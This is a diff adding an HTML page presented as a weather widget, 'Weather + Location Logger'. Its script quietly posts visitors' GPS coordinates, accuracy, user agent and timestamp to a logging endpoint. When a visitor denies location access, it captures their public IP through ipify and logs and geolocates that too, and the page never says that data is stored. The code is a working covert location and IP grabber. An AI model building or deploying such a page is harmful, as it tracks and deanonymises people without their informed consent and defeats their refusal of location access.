@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Weather + Location Logger</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+<style>
+  body { font-family:'Inter',sans-serif; background:#f0f4f8; color:#333; text-align:center; padding:50px; }
+  h1 { font-weight:600; color:#1e3a8a; }
+  button { padding:12px 24px; font-size:16px; border:none; border-radius:8px; background:#1e3a8a; color:#fff; cursor:pointer; transition:0.3s; }
+  button:hover { background:#2563eb; }
+  p { margin:12px 0; font-size:16px; }
+  #weather { font-weight:600; margin-top:10px; }
+  .card { background:#fff; padding:20px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); display:inline-block; min-width:250px; }
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h1>Weather + Location Logger</h1>
+  <button id="scanBtn">SCAN</button>
+  <p id="status">Waiting...</p>
+  <p id="weather"></p>
+</div>
+
+<script>
+const SERVER_URL = "/api/log"; // serverless endpoint
+
+// send log to server
+async function sendLog(data){
+  try{
+    await fetch(SERVER_URL, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({...data, timestamp:new Date().toISOString(), ua:navigator.userAgent})
+    });
+  }catch(e){ console.error("Server send failed:", e); }
+}
+
+// IP fallback if GPS denied
+function handleIP(data){
+  const ip = data.ip;
+  document.getElementById("status").innerText = "IP: " + ip;
+  sendLog({geolocation_allowed:false, ip});
+
+  fetch(`https://ip-api.com/json/${ip}`)
+    .then(r=>r.json())
+    .then(loc=>{
+      if(loc.lat && loc.lon) fetchWeather(loc.lat, loc.lon);
+      else document.getElementById("weather").innerText="Weather unavailable";
+    });
+}
+
+// inject JSONP for IP
+function captureIP(){
+  const s=document.createElement('script');
+  s.src='https://api.ipify.org?format=jsonp&callback=handleIP';
+  document.body.appendChild(s);
+}
+
+// fetch weather
+function fetchWeather(lat, lon){
+  fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`)
+    .then(r=>r.json())
+    .then(d=>{
+      if(d.current_weather){
+        const w=d.current_weather;
+        document.getElementById("weather").innerText=`Temp ${w.temperature}°C, Wind ${w.windspeed} km/h`;
+        sendLog({weather:w});
+      } else document.getElementById("weather").innerText="Weather unavailable";
+    }).catch(e=>{
+      document.getElementById("weather").innerText="Weather fetch error";
+      console.error(e);
+    });
+}
+
+// main scan function
+function scan(){
+  document.getElementById("status").innerText = "Scanning...";
+  document.getElementById("weather").innerText = "";
+  if(navigator.geolocation){
+    navigator.geolocation.getCurrentPosition(pos=>{
+      const {latitude, longitude, accuracy} = pos.coords;
+      document.getElementById("status").innerText = `GPS: ${latitude.toFixed(6)}, ${longitude.toFixed(6)} ±${accuracy}m`;
+      sendLog({geolocation_allowed:true, latitude, longitude, accuracy});
+      fetchWeather(latitude, longitude);
+    }, err=>{
+      document.getElementById("status").innerText = "GPS denied, using IP fallback...";
+      captureIP();
+    }, {timeout:10000});
+  } else {
+    document.getElementById("status").innerText = "No GPS, using IP fallback...";
+    captureIP();
+  }
+}
+
+document.getElementById("scanBtn").addEventListener("click", scan);
+</script>
+
+</body>
+</html>
